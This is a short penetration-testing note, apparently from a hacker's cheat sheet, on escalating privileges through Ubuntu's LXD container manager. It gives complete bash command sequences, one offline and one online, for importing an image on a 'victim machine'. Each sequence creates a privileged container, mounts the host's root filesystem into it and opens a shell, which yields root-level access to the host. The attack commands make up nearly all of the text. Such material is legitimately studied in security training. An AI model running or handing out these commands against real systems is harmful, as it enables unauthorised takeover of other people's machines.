LXD is Ubuntuâ€™s container manager utilising linux containers. It could be considered to act in the same sphere as docker

The Nethod below works for systems that are not connected t the internet. 

```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default 
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

# interact with the container
lxc start mycontainer
lxc exec mycontainer /bin/sh

```

If a system is conneced to the internet then this proccess is a lot easier. This method works.

```bash
lxc init ubuntu:16.04 test -c security.privileged=true
lxc config device add test whatever disk source=/ path=/mnt/root recursive=true 
lxc start test
lxc exec test bash
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
